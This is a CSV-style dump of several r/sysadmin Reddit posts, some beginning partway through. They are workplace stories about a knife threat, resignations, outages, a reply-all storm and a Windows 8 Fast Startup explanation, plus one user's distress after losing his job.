1371671015.0,1025,self.sysadmin,1goci8,A new one on me - user physically attacked me this morning,1230,205,452,http://www.reddit.com/r/sysadmin/comments/1goci8/a_new_one_on_me_user_physically_attacked_me_this/,"One of my clients got tired of seeing Facebook, Twitter and other social sites up on the computers, despite his policy of computers being used for only work purposes (none of which require access to Facebook or similar sites at this company). So he had me block access to every social media site we could think of over the weekend. 

Monday I got any number of calls complaining about it but when they found out the owner had me do it they quit bitching.

Except for one guy. The guy who is their best salesman but who is known throughout the company for having a temper and a somewhat hostile attitude (he has problems, wife has dumped him for cheating, money issues, etc). This gentleman was off Monday and Tuesday and was really, really unhappy he couldn't access MySpace this morning. Luckily for him I happened to be in the building so he was able to approach me in the server/phone room regarding the matter.

When he found out I had blocked the social sites at the owner's request he was (to put it mildly) extremely displeased. He first demanded that I make an exception for him and when I declined he quickly escalated to shouting at me.

Then he got between me and the door and pulled out a knife. Not some shitty pocketknife mind you, but one that looked like it could do some real damage. A ""where the fuck could you hide a knife that size"" kind of knife. Or at least it looked really big at the time. All I could think of was to push an office chair at him as hard as I could and get the hell out of the room. Not my most heroic moment but it worked.

I ran straight to the owner's office, closed the door and babbled out what had just happened. He called 911, took measures to look for the guy along with some other folks but he had left the building. They locked down the building and put everyone in the break room or the conference room.

Police found the guy sitting in his car in the parking lot talking on the phone. He told them he had pulled the knife on me to get me to listen to him according to the officer who talked to me afterwards. They arrested him of course.

Before I left the owner had me disable the guy's account and he was personally packing up the guy's personal belongings. The owner is going to get a restraining order on the guy to keep him away from the company and tells me he'll pay his attorney to get a restraining order to keep him away from me as well. 

I'm not sure if the owner of the company will demand the guy gets prosecuted or not. I'm not going to unless the owner asks me to. It was scary as hell at the time but I don't think it was personal so much as just him reaching his breaking point. Really I just don't want to see the guy again. Owner thinks that the guy will probably leave town if the charges get dropped.

**TL;DR:** Brought an office chair to a knife fight, survived by running away.

I was told that one of my top clients had passed away from a massive heart attack. 

I've been handling his companies IT needs for several years now, and he was by far my favorite client. He was the kind of client that didn't mind spending money, as long as he understood why he had to. When something big broke that disrupted his business, he never freaked out. He just wanted to be kept up to date on the situation and would let me do my job without being hassled.

When I first picked up his account, I was with a pretty crappy company. He had problems with how the company priced certain items (some things had a 400% markup), and also had trouble with dealing with other techs (showing up late, or not fixing things). I always busted my ass for him, and he seemed to really appreciate it. 

Due to a downturn in my companies revenue (losing clients because of aforementioned reasons) I was laid off. Before leaving that day, I set my out of office reminder with a quick message that basically explained that I was no longer with the company, and to please direct all calls to the support number/email address. Well he emailed me about something, got the response, then immediately called me to find out what happened. I filled him in, and he couldn't believe it and asked for me to stop by and meet with him. He said without me there he wanted to find another IT company, and asked for me to help him on the side till he found one. I agreed to help as much as I could while I searched for a job. Well he eventually found a new IT company, and mentioned to the companies management that I was out of a job and asked if they had any positions available. Turns out they did, and were so impressed by the recommendation he gave me that my interview was a cakewalk. I am now with a MUCH better company solely because of him.

So yeah, I owe him a lot and was (am) floored by his unexpected passing. In my experience it's rare to have such an outstanding client, both on a personal and professional level. RIP.

We've had a few requests from the community to do a tech-focused AMA in /r/sysadmin, so here we are. The current sysadmin team consists of myself and rram. Ask us anything you'd like, but please try to keep it sysadmin-focused!

Here's a bit of background on us:

alienth

&gt; I've been a sysadmin for about 8 yrs. My career started on the helpdesk at an ISP where I worked my way into my first admin gig. Since then I've worked at a medium-sized SaaS provider, Rackspace, and now reddit. My focus has always been around Linux (and a tiny bit of Solaris).

rram

&gt; I'm Ricky. My first computer was an Amiga at the ripe young age of two. Since then, I was the sysadmin at [The Tech](http://tech.mit.edu/) and on the Cloud Sites Team at the [Rackspace Cloud](http://www.rackspacecloud.com) with alienth. I have experience with Debian, Ubuntu, Red Hat, and OS X Servers.



**EDIT [1302 PDT]:** Hey folks, we're going to get back to working for a bit. We'll definitely be hopping in here later today to answer more questions, and we'll continue to do so when we can throughout the week.

1373004291.0,818,self.sysadmin,1hoeri,Is my IT career over?,1095,277,594,http://www.reddit.com/r/sysadmin/comments/1hoeri/is_my_it_career_over/,"So I have had a pretty rough year on top of a pretty rough life in general and Im starting to think my career in IT (sys admin stuff obviously) is over with due to it.

For starters.....my credit history isnt that great.   A lot of it is medical issues but I do have a gym membership scam that hit my report a while back as well as a cell phone bill from a long time ago as well.  On top of that, due to my recent job loss, which Ill get into more below, my car is being repo'd so that will be on there as well.

Now, here is the rough part.  

Last year my (ex?)girlfriend had a severe alcoholism relapse.  Long story short, I would come home to her drunk as a skunk, belligerent and constantly trying to argue.  She was working at the time so it isnt like I could just cut her off financially for that stuff and she was always sneaking it somehow.  I came home one day and she was intoxicated and was letting our daughter, who was 3 at the time, watch some my little pony parody where they were getting chainsawed to pieces and I let her know what I thought. This turned into her screaming and yelling at me through a locked door(i had lcoked myself in a bedroom).   They next day I come home from work and she is gone with a note saying she is leaving town.  She ended up going to her sisters, who lives 4 hours away.  She also decided to file an injuncition for protection against domestic violence against me and in it she had literally pages of stuff that was untrue or heavily skewed.  Before my day in court, I had sent a very long letter responding to the accusations for which she had no proof of any kind what so ever, and in fact I several video of her being drunk and belligerent, screaming at me, kicking doors, etc.  The day of the hearing, i go up to the stand and it turns out the judge didnt even look at what I had sent and when he was up there, he just scanned through her paper work, didnt ask my anything and gave me a 6 month no contact order.  The only contact we could have was arranging time sharing with our daughter.  Fast foward a few months, he sister gets sick of her and kicks her out and her mother helps her get a 1 bedroom apartment back where in town.  I let her take the Washer and dryer and even move it over there but when I did, I had forget the dryer vent.  I let her know Ill bring it over as soon as I can.   Later that day I bring it over, I knock and she doesnt answer so I call her. she tells me she doesnt feel like getting up and coming to the door so I ask her what she wnts me to do.  During this, our daughter is with my playing and running around me.  I urn around, get caught up on her and lose my balance.  Note that I had the phone in one hand and the vent and tools in the other.  I go to brace myself with my foot, it hits the door and it cracks the frame a bit(the door wasnt actually kicked open and you could see the wood rot on the frame as well), she freaks out, calls the cops(I can hear her inside) and tells them Im trying to break in (over a dryer vent? really) .  I keep telling her I tripped on our kid but she isnt having it so I freak out and leave.  To shorten this up a bit, I end up in jail and the arresting cop puts FELONY CHARGE on the booking. 1 count of contempt of court(breaking the no contact order) and 1 count of criminal mischief.  Being as neither one of these were actually felonies, they were recertified as misdemeanors and the public defender was able to get a no contest plea for me with adjudication withheld.  The only reason I didnt go to trial is because I couldnt afford a lawyer but made too much to get any more public legal help..or something along those lines.  

I ended up losing my job because of this and have been unemployed since.  I actually had to move into a cheaper place and when they did a background search it came up as me having a felony for contempt of court for violating the domestic violence injunction so I had to go to the court and get paperwork showing it was recertified as well as the adjudicaiton being withheld.

I have been applying to jobs since and gotten several interviews but obviously have had no luck. 

So now when people run my background they are seeing a not so good credit report and a felony involving domestic violence and no one has even asked me about it or my side.  I also have not been able to pay my court fees (unemployment  doesnt even cover my living costs of rent and food)so my license was suspended.

Is my IT career over?   

Am I doomed to working day labor jobs?


Ive been trying to stay as positive as I can but somedays I just want to give up on life.  I even try to convince my self our kids will be better off without me.

What do I do?

Would any of you hire me with my credit history and background check?

oh yeah and on top of all that, I have $1500 left in unemployment    :(

My original post is [here](http://www.reddit.com/r/sysadmin/comments/168e4c/i_want_to_quit_tonight_am_i_crazy_is_there_any/).

First of all I want to thank EVERYONE who posted in my previous thread with supportive, AND contrary positions and thoughts.  I took as much of the feedback in that I could before it was time to deal with the situation and took quite a bit of it in with me when I started my meeting.  I appreciate those that centered me on how lucky I was to have a position at all, as much as I do those who showed me that my time and health and sanity are worth finding a new place to spend my days.  

**UPDATE:** Someone gifted me reddit gold, on my throwaway account, which also has now more karma than my main account.  Seriously, I appreciate the shit out of the support this community has shown me in the past when I had technical issues to tackle, and now with larger career affecting decisions.  You guys are THE most powerful tool in my IT toolbox.  Thank you.  I will now go search ebay for an appropriate monocle.

**TL;DR= I left my job after setting out requirements and being turned down/blown-off.  I do not have a job waiting to fall into unfortunately, but I have been offered some contract work in my immediate area I can pick up to keep busy and pad my account while I hunt.  I am dedicating the next several days to resume rebuild and then a storm of selling myself towards a better role, somewhere in the US (yes, I am available to work anywhere in the 48, immediately).**

I went in to work yesterday and arranged for a meeting to discuss ""IT needs moving forward"", with my CTO who is my direct supervisor on what little paperwork there is that resembles and organizational chart.  As we left the front room to head to the conference room, the office manager started to get up from her desk and I abruptly asked the CTO ""This is just a meeting for you and me right now, right?"" and he paused and hesitantly acknowledged and then looked at her and she sat back down.  I think this was the first instant he realized this was not going to be a normal meeting.

We sat down and he pulled out a pad and pen and asked what was on my mind and what I thought we needed for IT to 'perform better moving forward'.  Immediately setting the tone as one of blame on me and my need to improve.  This is kind of how things go there, but I was much more sensitive to it after a night's sleep and all the advice and feedback I read in my previous post.

I took over at that point which got a slight look of shock and surprise from him and I just want to thank everyone in the other thread that pointed out that I did not say NO enough or set limits on my abilities and responsibilities.  This was instant proof that you were all right, and I will not let myself get to this point in a future position again.   From that point on I was able to outline several points.  

1) When I was hired the company was 20 people strong with 1 office in LA and a small sales outpost in the mid-west.  It is now 60+, adding about 2 per month, with offices in LA, 2 in the Midwest, the beginnings of one in Japan, and plans for Europe, along with about 10 constantly roaming or home-based remote sales managers.   It was clear to me at the beginning that additional IT help was going to be required shortly, even at much smaller numbers/offices.

2) We have along the way absorbed a smaller company, which led to introducing their work flow, systems and style into our own while on-boarding everyone that remained with us.  This expanded the equipment and software packages I was expected to manage, as well as nearly doubled the end-user support work load instantly, without even getting into the conversion time to get all of their laptops and PC's swung over to our domain and the close out of theirs.

3) I have travelled 6 times to the midwest this year, and under quite less enjoyable circumstances than any of our media or project management staff do.  This was specifically in reference to the work load's expected of me by the other staff members from their self-centric points of view and unrealistic time lines they set.  2 Specific trips were rife with ""above and beyond"", and there was not any note of that upon completion of those trips.  I can lay out the horror story details if anyone wants to read the gore, but suffice it to say a 3 day trip to 1 city, ended with me driving a uhaul with about $200k worth of kit to another mid-west city, and finally flying home a week and a half later.  All outside of the scope of the original ""fly-in, fly-out, just paperwork right now"" plans.  I still remain the only IT capable resource in the company, and I am based in LA while the bulk of my end-user support is focused on mid-west locations.

4) Our media team continually requires network accessible storage for multiple users to work in with a good performance.  This is our Netapp which was purchased before I arrived, but was not installed until I was there as no one knew how to set it up.  The capacity of that system runs at about %95 or more full, which for a 'work space' is rather high.  The nature of our products requires them to be readily available for changes after release should a client or regulations require, but continuing to hold it on the prime workspace limits the ability to bring in new projects.  The shuffling of this media off, to 'archive', consisting of external USB drives ties up workstations, network capacity (copy from Netapp to workstation to drive), and is inefficient as it requires in-office hours to be done.  Another network based option has been required for the better part of a year and unanimously everyone in the media department has stood behind me yelling about it.  There has been NO acceptance of any change to the current system.  All ideas forwarded have been put in the ""we'll talk about it in a few months"" folder.  This even happened DURING this meeting on this item.

5) When we absorbed the smaller company in the mid-west, they had a IT guy supporting 7 in-office staff at the time, and 4 remotes.  This person for whatever reason decided not to come along for the ride.  A generous offer was made to them but they passed and continued on their own path.  This puts into record that at that point, mid-last year, the decision was made that we DO have use for an additional IT resource in the company.  His skill set was a bit more tuned to DELL/Windows support than mine, which would have been a big step in the right direction for dividing and conquering the demands placed on me.  After he made the decision to turn down the offer, there was never a renewed discussion about additional IT hires.

6) We have had a ticketing system that no one in the company has been forced by management, who sets a bad example themselves, to use for all their needs.  Often times I am not able to take a step away from (nearly always) ""mission critical"" support issues for someone, to work on entering the ticket information to open it, updating it with my progress, and then closing it out for someone on their behalf.  The idea that we are not big enough to warrant someone answering a phone, opening a ticket and handing it off to the right person to deal with it (he admitted they are not always something I should have to deal with), was floated.  I told him that if our staff could not manager the simple send of an email to a specified address, then yes, that's exactly what we needed.  He told me they were doing 'very important things' and didn't have time to always open a ticket, but he would be willing to send an email to everyone stating that they should.  I reminded him that the CEO and President has previously stated that to everyone in a company wide meeting call, and in emails, to no avail.  He was convinced that his email would have different results.

7) The appointment of the office manager to be my direct supervisor was not previously discussed with me and wasn't clear as far as reasoning goes.  Her resume lists time at a large web company that has recently been in the news undergoing lots of leadership changes... as a meeting coordinator and PR person.  This was cited as her 'qualification' to ""help me understand the companies needs moving forward.""  I was at this point, wondering why they hired me, citing my experience and skill set as the tools they needed for guidance in how to help scale and grow and allow the CEO to stop being ""the guy who fixes your outlook""... if they had her the whole time.  He had no response to that other than to say, that all of their IT needs were at one time just handled by individuals, or 1 person (the CEO).  I reminded him that was when they were 1/6th of the size or thereabouts, with 1/2 of the incoming contracts, for 1/2 the size of the work the current ones pull.  This led me to my next topic.

8) The company still operates, with great fanfare in CEO led speeches about dedication and opportunity vs. success meetings, as if it's 5 guys that went to college together, in 1 office room, eating cold pizza and promising to do things they had no idea how to do just to get jobs for their new company.  They're in 'Startup mode' still mentally, and un/fortunately, they've grown WELL beyond that point and are now a well known name in the industry, shoulder to shoulder with companies 5x the size and time in the space.  They should be proud of that accomplishment, but they need to be able to adjust to it as well.  Driving a bus is not the same as driving a mini cooper.

Oh, and yesterday I put in my notice.",686,156,360,http://www.reddit.com/r/sysadmin/comments/sqe1f/i_just_got_off_a_conference_call_where_i_bluntly/,"So! Long and incredibly amusing rant here. I work for an aerospace company. A rather large one that services all the major players. If we don't work properly, planes don't get built. 

We've got a history of corporate dictating what needs to be done. You see, they have a great idea that we can take all of our branch office IT folks, make teams, and tackle corporate issues like infrastructure, e-mail, ERP system, web filtering, and NOC this way.

The problem is that when the technical teams give management the down and dirty, the response is ""Oh, this costs money? Fuck that."" and they pull in a consultant that has no idea what they're doing and no idea of the history of issues our infrastructure has. 

We need more than a T1 line at each branch office for an 8000 person company? Shaw! That costs money!

So, around 8 months ago, I got in a royal pissing contest with the CIO of the company. I was told that I'm being rude, that I'm not a manager, and I don't have the rights to make demands of our consultants for things like testing and validating configuration. This is consistent with the history of us pointing out something isn't technically feasible, such as supporting a baseline 20 MBPS throughput requirement at the data center in the event of a failover when our failover line has ~ 4 MBPS of bandwidth capabilities... Or like pointing out that a one forest, one domain infrastructure with 100+ global catalogs on T1 lines from California to China to Germany isn't feasible nor recommended... Or that centralizing our ERP and DNC systems to the data center is a stupid idea... 

Anyway, as usual, I was told that I'm an asshole and to STFU and let management make their decisions.

Fast forward to today. All of our infrastructure lines for our MPLS have failed. Hard. It's been down for 6 hours. As a result, the VoIP system based out of corporate? Down. The DNS system based out of corporate? Down. E-mail? Down. Internet? Down. ERP manufacturing? Down. Internal communications? Down. VPN? Down. 

Every single corporate system is down and this has rendered 70% of our manufacturing or shipping capabilities as a hard failure. Isn't that a great way to start the day for a multibillion dollar company? 

---

Now then, I predicted this months ago. I've been saying it for YEARS. And constantly ignored. Hell, I'm solo this week 'cause my partner's on Vacation. I asked for an assistant 6 months ago. They said they'd hire one by April. Then before my cohort left for vacation. And... he's been gone since the 16th. 

So, I told the Controller yesterday that next week I'm giving 2 weeks notice, when my cohort gets back. I had a long conversation about how I'm frustrated that corporate isn't reacting to our needs, that I don't like the direction we're going, and that if anything bad happened it would be catastrophic to our business capabilities. 

I get a 6 AM phonecall about how internet isn't working. I figure it's just our web filter and tell 'em I'll deal with it when I get in. At 8 am I get another call - NOTHING is working. E-mail, Internet, Helpdesk... nothing. So I skip my shower, skip breakfast, and book it to work. Get in and what do I find?

Complete. Catastrophic. Failure. It is incredibly ironic that less than 12 hours later, all three lines managed and provided by Verizon at our data center failed, then cascaded into the rest of our routers, taking down our entire MPLS network. Nothing relying on anything corporate, which they've been insisting everyone integrate into and join up on because it can't possibly fail... NOTHING works for over 70% of our facilities. My facility we stone walled the VoIP and ERP projects, so is still functioning, but our E-mail, Internet and integrated reports for other companies are down. 

---

So as I'm briefing the President on why we can't ship product, he gets a call from let's call him ""Bob."" ""Bob"" wants to know if we're down or not because he's running some damage control to figure out what's up. My president tells him that he was talking to our IT guy [My boss's name] and offered to let me fill him in. 

I say ""Hi, this is Michi, not [Boss's name] - sorry. What would you like to know?"" 

""Well, for starters, how did this happen?""

I just addressed our infrastructure concerns. The fact that our sites are all on T1 lines. The fact that our backup lines connect to two 10 year old concentrators with an aggregate throughput of 4 MBPS and basic business operations are 20 mbps minimum, the fact that we centralize everything to a single data center despite every professional recommendation being to set up a collab datacenter on the other coast; and of course the fact that we've got a culture of ""ask a consultant"" when the technologically capable folks that have been here have a far better understanding of the challenges, and management just ignores us because the consultants tell them what they want to hear.

So... I just gave straight criticisms of how management ignores what's technologically feasible in favor of what they want to hear and whatever's cheapest, and that's exactly why we are in a situation where we can't ship, can't make phone calls, can't fax, can't e-mail, can't get to the internet, and can't manufacture at 70% of our plants. 

My president is sitting there staring at me across the table when I stop talking, mutes the phone and quietly says ""You do realize this is one of our board members, right?""

...

I just smile and shrug. I told them yesterday that I'm giving notice. So the conversation ends on the phone and the President is trying to convince me to stay, pointing out that these kinds of challanges are going to be present at any company, etc. Which is true. But this was my first true IT job outside of a call center. I've been here 5 years. I've learned a lot, and not just about IT. For 2 years there was a wage freeze where we didn't get raises. Every year I've consistently scored exemplary on the internal reviews. I've gotten two awards for outstanding performance and a commendation letter from the CIO. Each of those years I got almost nothing for a raise - 3% tops. In California, the cost of living went up 9-12% each of those years. Then they cut me to Salary, against the law in California for IT professionals unless you make a certain amount - which I don't. 

They consistently pay me just over 53k/yr while I'm performing advance database recovery, designing the infrastructure of our new plant in Mexico, implementing and designing VLAN changes to support business goals, completely restoring an active directory failure where Kerberos just disappeared while maintaining their data and getting Samba back up and running, making technologies from 1992 live on current day hardware, recovering hundreds of millions of dollars of contracts from places they were given up on... Literally any problem that nobody else could fix, I was called for. I don't know how I do it, I just learn the tech and find a solution. And they know this, they call me to fix it. Fucking AD is down? Bam. Found a fix in two hours. Was a USN rollback. Can't e-mail Boeing? Bam. Found the bug in our TLS and fixed it. Database won't mount? Bam. Found out that the transaction log was corrupt and built an empty one and got it back online, despite the vendor and Microsoft both saying it couldn't be done and we were SoL. 

So I get promoted into a position that pays less than when I was making overtime. Thanks. Oh, and another 2% raise this year! Thanks guys! 

They don't care about my challenges. They don't care that I needed an assistant. And suddenly they want me to stay? Sorry, but I've lost enough sleep performing goddamn miracles for a company that doesn't appreciate me. 

So enjoy your catastrophic failure.  I fucking told you so.

As for me? I've got a feeling that I won't be out of a job for any significant period of time. I've already got another offer expected to be in my inbox before I collect my final paycheck from here, and even if that doesn't materialize, this place just isn't worth sticking to.

We got the call from the Loan Officer to see if we could remove it from the file, since the system auto filed it with all the other pictures of bank statements, pay stubs, etc etc. When you opened up his file BAM. Penis.

The great part was before we could remove it, we had to have a half hour long discussion with our lawyer about whether we were *legally allowed to remove it.* Explaining the deletion of an ""official"" document to an underwriter was fun too.

Here is my resignation.",595,139,198,http://www.reddit.com/r/sysadmin/comments/xaumt/happy_sys_admin_day_you_say_here_is_my_resignation/,"The last Friday of every month is a huge meeting with the C's, managers and directors for the company.  This is mostly a status meeting on the various departments and a circle jerk.  This one started off just the same as the past ones.  Catered breakfast from some fancy place, which is insanely expensive, but who am I to complain about spending money?

The big announcement this morning was the big conference we are attending in San Francisco **next week**.  Here we are show casing the new SaaS product I built, a standalone mobile version I built and whooing potential customers.  The CEO cuts into for a break so we kinda just stand around eating and chit chatting.  

While this is going on, I overhear the marketing director say she got 4 first class tickets to San Fran and a sweet hotel in some ritzy part of town for her and 3 other co-workers.  ""Don't worry, I'm expensing all of it to the company!!"" She also mentioned that her Mac Book Pro has died last night and that she lost all her company data.  I note this in my ""I'm going to screw you later with this info"" part of my brain.

We all sit down to do our formal status reports.  Basically we each get up to the podium, talk and click through PowerPoint presentations.

Dev Director says that they finally fixed a major bug and it has pleased our most sensitive clients.  She also notes that they made a major break through on performance on a new system (that I built) that one of her developers built.  

Services Director says that **they** solved a problem that has plagued them for a few weeks for one client and solved a ""super complex"" problem for another client that was solved under 6 hours.  He lauds his consulting staff for pulling together and fixing everything.

Security Director rambles some shit about MS patches and how we need to start doing regular patches and testing for our product line.  She also goes into saying how our SaaS product needs more firewalls.  I wish I was making that last one up.

Sales and Marketing Director goes into saying how our products have no competition and that the clients and customers are happy.  She even goes into saying that her new UI design for our flagship product has gotten nothing put praise from the ""community."" - whatever that means.  

We take a 10 minute break for coffee and pee time.  I, on the other hand, finish my email version of my resignation and my new PowerPoint where I stick it to them.

After the break, I get up to the podium and I am shaking with rage.  Most people have noticed this and are look at me with concern.  I know at this point I am sweating profusely.  I try to start speaking and stutter a bit.  The CEO asks if I'm okay...

""No I'm not okay.  This bullshit ends today.""

I pull up my PowerPoint on the projector and go line by line where I blast each person in the room.  

Dev Director, that bug your team fixed? Took them 6 years? All it took was a junior developer fresh out of college to point out an infinite loop that crashes the application.  That performance server?  **I built that**, not your guy.  Why does it seem like your code is faster?  It's running on SSD's.  ON DESKTOP HARDWARE. It is a shame that our product is so poorly written and implemented that a $50k server can't make it faster.  There is no reason to have 100,000+ ASP files spread across 2,800 folders for single application.  (Showed a screen shot of properties of the wwwroot folder)  

Services Director, your incompetent team of consultants had to come to ME to get their issues fixed.  Every time.  The first client you mentioned that took so long is because it took your team 3 weeks of doing nothing and coming to be and ME giving them the solution in 10 minutes.  Same for the 2nd client.  I should not have to draw pictures to explain how a load balancer works to your top ""technical"" people.  The reason why it took 6 hours is because 5 of those hours was them trying to give me the load balancer configuration.  The fix?  Uncomment the IP's of the other 4 nodes.  LOAD. BALANCED.

Security Director, I was the one pushing to have scheduled patch maintenance.  You disagreed with the idea in every other meeting.  You go to one security conference and now it has to be a top priority?  Physical firewalls between servers?  Have you never heard of ACL's? VLAN's? 802.11 security? SELinux?  

Sales and Marketing - No competition you say?  (I pull up a product that does what we do, but uses SharePoint 2010 as a base).  It took these guys 6 months to roll this out.  And it does more and I'll bet it runs 10 times faster than our stuff.  Your UI, is so good?  Do you just toss the customer surveys with negative feedback?  (Pull up survey report for all to see) #1 complaint, UI is terrible.  CEO, feel free to sort through this.  Trying to sneak in 4 first class plane tickets and a ritzy hotel stay and have the company pay for $13k for it?  [No wonder I can't buy proper hardware for our SaaS system!](http://www.reddit.com/r/sysadmin/comments/txkj5/has_anyone_just_walked_out/c4ql8jt)  CEO gives death stare to Marketing Director.  Also, you didn't want to use the laptop I issued you for your Mac?  How did that go?  Lost all your data?  I certainly hope you don't have any of our client stuff on there?  You did backup your own laptop right?  Or perhaps its all in SharePoint?  2nd death stare from CEO to her.  

Jaws on Floor.  What felt like an eternity to me was really 3 minutes of LOIC verbal DDoS from me.  

I continue in a normal tone and manner.  

&gt;Today is International Sys Admin Appreciation Day.  I find it quite ironic.    
&gt;
&gt;I have worked tirelessly for this company for 3.5 years and to be shit on by all of you, just to cover your ignorance, arrogance and pride.  I have been nothing but a faithful employee doing my best with my team to keep this company running smoothly.  I don't care for pats on the back or simple ""thank you"", I don't want to be lied to and take credit for my work.  I expected more decency out of all of you.  
&gt;



CEO ushers me to his office.

I don't apologize for anything.  He asks me what prompted all of this.  I tell him that he has been lied to for a long time about stuff in the company and he needed to know.  He didn't know that we have over 3,900 bugs in our flagship product or that our customers on a daily basis complain about the products.  I told him flat out he needs to start getting rid of certain people, implementing Change/Process Management and to not be afraid of the word ""Code Freeze"" in development.  I printed my resignation letter on his office printer.  The CEO said he understood and would have done the same thing as me.  We shook hands and that was that.  

I put in my 2 weeks yesterday and the amount of butt hurt all day from the rest of the staff was overwhelming and satisfying to me.    
 

[edit] Yes, I do have another job lined up.  A much better one at that and more pay.  

I also have a meeting with the CEO tomorrow (Sunday) for brunch.  He said he isn't going to fire me :), but I'm sure he wants to negotiate to have me stay.  Fat chance, but I'll humor him. 

[edit 2]

I know I didn't clarify this, but I have been working with each of those people mostly through email (CYA) and verbally about their attitudes and deficiencies for 3 years.  I don't just point it out, I offer to help where I and my team can.  The repeat offenders and what not I take to HR, but all that gets done is a written note in our files and that's it.  I am all about continuous improvement, but when I get stonewalled due to personal vendetta's and office politics, I draw the line.  

Do I want to come out as some kind of martyr? or hero?  No.  I just want the bullshiting and baffoonary to stop.  I have a lot of co-works that I respect.  They work hard and do their best.  Those are the ones that are really moving the company forward.  And to see their management misguide and misuse them is hurting everyone.

When you ""Shut Down"" a Windows 8 computer with the default settings it doesn't ""Shut Down"" Windows and then re-initialise it from scratch upon boot. Instead it does a mini-hibernation, which includes caching the registry, and many system files (from RAM, not disk).    

So if you make a change which requires a restart then you must use the ""restart"" option to do so. The restart option does in-fact reload the registry hives and key Windows files, whereas the ""shut down"" option does not.   

This is all controlled by the following new setting:    
&gt; **Fast startup** is a setting that helps your PC start up faster after shutdown. Windows does this by **saving system info to a file upon shutdown.** When you start your PC again, Windows uses that system info to resume your PC instead of restarting it.   

This seems to include either part or all of the Windows Registry.

When I got there, the head of IT was already on site and doing damage control. Fortunately the facility manager of the building knows his shit and had shut off power to the LAN room not long after the flood started.

We lost all our switches for the floor, 4 big servers, most of our cell phone IBS, dozens of miscellaneous PoE injectors, ATAs, fiber to copper converters, etc. It was a clusterfuck (actually, still is). 

On top of it all, they were still hunting for that SOB marathon bomber. About an hour and a half after I got there, they issued the ""shelter in place"" orders. I spent the day half-awake, shuffling between trying to figure out what we could do to get shit back online, watching twitter for the latest on Mr. McBombyDouche and nodding off at my workstation.

Sat down with the president/owner (CEO was a misnomer on my part originally, apologies.) just a little bit ago to make my case in as well-prepared a fashion as possible with logs, rather than just getting blindsided like last week.

I focused on the possible damage to our ability to send email to clients, as well as noting the difficulty of tracking / detecting viruses that may not present obvious symptoms, and pointed out the approximately 1100 infections that were stopped in the last 12 months.  It took about 30 minutes of back and forth with him trying to dismiss my objections to his decision at two separate points, but I wouldn't let go and just breaking it down into simpler and simpler terms.

At the end, I'm exhausted and feel like I just ELI5'd the history and anatomy of computer virii, but I got his signature on the renewal request and have already completed the order and updated the server.

So, I live in Asheville, NC, and President Obama decided to come to town to give a speech at a manufacturing plant.  No biggie, he's been here before, just a few traffic problems when he does.

One of our employees decides to be helpful and send out a message to everyone in the global address book to let them know to avoid the part of town he's going to for lunch because of traffic.  Unfortunately, itsupport@company.com is on the list, and that's what Spiceworks listens to.  So, now he's created a new ticket in Spiceworks, with the entire company directory on the CC list.  People start hitting ""Reply All"" on the message with little quips, and Spiceworks updates the ticket with the notes and sends out new notifications to everyone, which prompts more responses and more notifications and me to start wanting to tell everyone PEBKAC every time I hear them walking into my cube behind me.  On top of that, the president of the company is away on vacation, so his out of office message gets added and redistributed to everyone.

I remove everyone from the notification list after the initial storm dies down and close the ticket, only to have someone else respond about where Obama's going to lunch (local BBQ place, really good.)  That reopens the ticket, readds everyone to the list, and sends out another notification.

Then the VP sends a message saying that it's all well and good that people are excited about Obama being in town, but to not use Spiceworks for stuff like that and for me to please close the ticket.  I respond to that e-mail to let everyone know what happened and how not to do it again, and then I get a message back from the VP saying ""SO WHY DID YOU REPLY ALL TO EVERYONE?!?""

Definitely hiding the itsupport address from the GAL.  This is such a stupid problem to have.  THANKS OBAMA! ;)

***EDIT***

I want to point out that it's not like they just did a ""send to all"" in the GAL like it was some automated thing.  They went through and manually selected every single address on the list, including conference room mailboxes I have set up for scheduling and accounts I only use for automated messages.  I get what you're all saying about using distribution lists, but unless I prevented users from selecting individual people from the GAL, that wouldn't have helped in this situation.",,False,self,t5_2qnp7,1360789218.0,,,True,t3_18giq1,http://www.reddit.com/r/sysadmin/comments/18giq1/thanks_obama/,

**[EDIT - THEY FOUND THE ISSUE!! ]** 

Ok, so I will admit that I am not too familiar with *how* this works, but the 10 minute phone call I got from my Enterprise Ops guy was that they attempted to update a driver for a specific set of NIC's (all Intel) and it did not work as planned.  

Using a GPO and a PS script, they attempted to update NIC drivers for several Intel-based NIC's.  The problem was that whoever keyed in the Hardware ID did it for the wrong NIC.  So, when you logged in, the normal login script runs, but at the end does the Driver update.  This is why it seemed like it was working for a bit and then disconnected.  Using a MSI installer, the script used the wrong switch commands and it forced the driver to be installed regardless if Windows says ""um... no, that's not going to work!""  Naturally, these are silent, no-user prompt/interaction installations.  On top of that, someone *else* copied the script and forgot to change the NIC's Hardware ID for the servers and since people just don't log into them, the Computer Account was designated for the GPO.  The script was to run at a specific time which that too got jacked up since no one seems to understand EDT vs. EST vs. ZULU (yes, we have ZULU requirements here too...)

I didn't get to ask about why this was not tested on real hardware before and I got a ""well, a non-technical person said it was not necessary and signed off on the push date...""  I was hinted that that person is no longer going to make that mistake again.  Ever.  For this company. 

As for the ""rogue box""  that is still under investigation.  I was told that BIOS password are being changed over the next few weeks.  I am actually **MORE** interested in the ""rogue box"" than this BS :3

------------------------------

**[EDIT]**  so, I got a phone call from a contact on the Enterprise Ops team (handles everything Active Directory) and the cause of this major issue *might* be due to malicious intent.  Running through logs of AD, a rogue workstation come onto the network and launched a PowerShell Script.  The box has been located and under investigation.  So far the box's BIOS is setup to power on every Monday @ 4AM EST.  That is NOT part of the normal config. 

Talking to the guy for awhile, I surmised that one could set the BIOS to power on at a given time, auto login, check the date, power off if date is less than a certain date.  If the date has past, it executes the PS script that uses a back door admin account and pushes the GPO.  I bet $100 on it.  I hope I'm right. 

We do have a policy that if a workstation has not logged into the network within 60 days, it gets dropped from the domain.  This would explain the BIOS power on at a specific time.  :/

I will update after I get some more information tomorrow (Monday).

**[EDIT 2]**
NO, we were NOT smoking in the office/conference room.  We were outside for over an hour chain smoking. 

I called my contact and left a voicemail.   I suspect that he won't get back to me until COB with all the chaos still going on.   Email is still down :-( 

**[EDIT 3]** It is now 2:40PM EST and things are getting back to normal.  The Enterprise Ops team has been very quiet.  My buddy on that team has not responded at this time about what could have possibly happened.  Nagios is slowly turning green with most of the major systems.  SharePoint is up, Exchange is still down.  Our MS Lync is working as a substitute for the lack of a fully functioning Exchange cluster.  We are able to log into our workstations but we have very limited network access.  I think this is due to the investigation of the issue.  I would also suspect that our IDS is on high sensitivity.  

